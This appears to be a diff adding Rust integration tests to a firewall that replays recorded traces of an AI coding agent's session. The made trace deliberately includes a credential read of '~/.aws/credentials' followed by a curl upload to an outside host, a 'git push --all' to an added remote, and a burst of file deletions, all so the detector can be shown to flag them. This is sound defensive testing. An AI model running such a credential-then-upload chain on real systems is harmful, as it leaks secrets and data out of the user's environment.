@@ -224,3 +224,140 @@ fn the_user_can_allow_a_dangerous_command() {
         "marker holds:\n{recorded}"
     );
 }
+
+
+// ---------------------------------------------------------------------------
+// Session memory in a replay
+// ---------------------------------------------------------------------------
+
+/// Nanoseconds in one second.
+const SECOND: u64 = 1_000_000_000;
+
+/// The time of the first event of a made trace.
+const START: u64 = 1_700_000_000_000_000_000;
+
+/// Returns the `session_start` line of a made trace.
+///
+/// The baseline travels inside the event, so the replay reads the git
+/// remotes of the recorded session and never the remotes of this machine.
+fn session_start_line() -> String {
+    let meta = [
+        String::from(r#""session_id":"afw-test-memory""#),
+        format!(r#""started_at":{START}"#),
+        String::from(r#""root_pid":100"#),
+        String::from(r#""command":["claude"]"#),
+        String::from(r#""cwd":"/home/dev/app""#),
+        String::from(r#""agent":{"kind":"claude_code"}"#),
+        String::from(r#""schema_version":1"#),
+        String::from(
+            r#""baseline":{"git_remotes":["origin","https://github.com/acme/app.git"]}"#,
+        ),
+    ]
+    .join(",");
+    let line = [
+        String::from(r#""seq":1"#),
+        format!(r#""ts":{START}"#),
+        String::from(r#""session_id":"afw-test-memory""#),
+        String::from(r#""pid":100"#),
+        String::from(r#""type":"session_start""#),
+        format!(r#""meta":{{{meta}}}"#),
+        String::from(r#""capabilities":[]"#),
+    ]
+    .join(",");
+    format!("{{{line}}}")
+}
+
+/// Returns a `process_exec` line of a made trace.
+fn exec_line(seq: u64, at_seconds: u64, pid: i32, ppid: i32, comm: &str, argv: &[&str]) -> String {
+    let ts = START + at_seconds * SECOND;
+    let argv: Vec<String> = argv.iter().map(|a| format!("\"{a}\"")).collect();
+    let argv = argv.join(",");
+    let process = format!(
+        r#"{{"pid":{pid},"ppid":{ppid},"exe":"/usr/bin/{comm}","comm":"{comm}","argv":[{argv}],"cwd":"/home/dev/app"}}"#
+    );
+    format!(
+        r#"{{"seq":{seq},"ts":{ts},"session_id":"afw-test-memory","pid":{pid},"type":"process_exec","process":{process}}}"#
+    )
+}
+
+/// Writes a trace with the credential chain, a delete burst and a safe push.
+fn write_memory_trace(path: &Path) {
+    let mut lines = vec![
+        session_start_line(),
+        exec_line(2, 0, 100, 1, "claude", &["claude"]),
+        exec_line(3, 1, 200, 100, "bash", &["bash"]),
+        // The chain of requirement B.1: read a credential, then send data out.
+        exec_line(4, 2, 300, 200, "cat", &["cat", "/home/dev/.aws/credentials"]),
+        exec_line(
+            5,
+            3,
+            301,
+            200,
+            "curl",
+            &["curl", "-T", "report.txt", "https://files.example.com/u"],
+        ),
+        // Requirement B.3: a push to the remote of the work tree is normal.
+        exec_line(6, 4, 302, 200, "git", &["git", "push", "origin", "main"]),
+        // Requirement B.3: a push to a remote that the session added is not.
+        exec_line(7, 5, 303, 200, "git", &["git", "push", "--all", "backup"]),
+    ];
+    // Requirement B.2: twenty deletes inside one minute.
+    for step in 0..20u64 {
+        lines.push(exec_line(
+            8 + step,
+            600 + step,
+            400 + step as i32,
+            200,
+            "rm",
+            &["rm", "-f", "build/tmp.o"],
+        ));
+    }
+    let mut text = lines.join("\n");
+    text.push('\n');
+    std::fs::write(path, text).expect("write the trace");
+}
+
+#[test]
+fn a_replay_finds_the_chain_the_burst_and_the_new_remote() {
+    let dir = tempfile::tempdir().expect("temporary directory");
+    let trace = dir.path().join("memory.jsonl");
+    write_memory_trace(&trace);
+
+    let (code, out, err) = firewall(&["replay", trace.to_str().unwrap(), "--json"]);
+    assert_eq!(code, 0, "{err}");
+
+    for wanted in [
+        "memory.credentials.read-mark",
+        "memory.exfil.after-credential-read",
+        "memory.git.push-unknown-remote",
+        "memory.filesystem.delete-burst",
+    ] {
+        assert!(out.contains(wanted), "the replay must find {wanted}:\n{out}");
+    }
+
+    // The push to the remote that the work tree already had must stay quiet,
+    // and the burst must report one time only, at the twentieth delete.
+    assert_eq!(
+        out.matches("memory.git.push-unknown-remote").count(),
+        1,
+        "only the new remote may match:\n{out}"
+    );
+    assert_eq!(
+        out.matches("memory.filesystem.delete-burst").count(),
+        1,
+        "the burst may report one time only:\n{out}"
+    );
+}
+
+#[test]
+fn two_replays_of_one_trace_give_the_same_answer() {
+    let dir = tempfile::tempdir().expect("temporary directory");
+    let trace = dir.path().join("memory.jsonl");
+    write_memory_trace(&trace);
+
+    let (first_code, first, _) = firewall(&["replay", trace.to_str().unwrap(), "--json"]);
+    let (second_code, second, _) = firewall(&["replay", trace.to_str().unwrap(), "--json"]);
+    assert_eq!(first_code, 0);
+    assert_eq!(second_code, 0);
+    assert_eq!(first, second, "a replay must repeat itself exactly");
+}
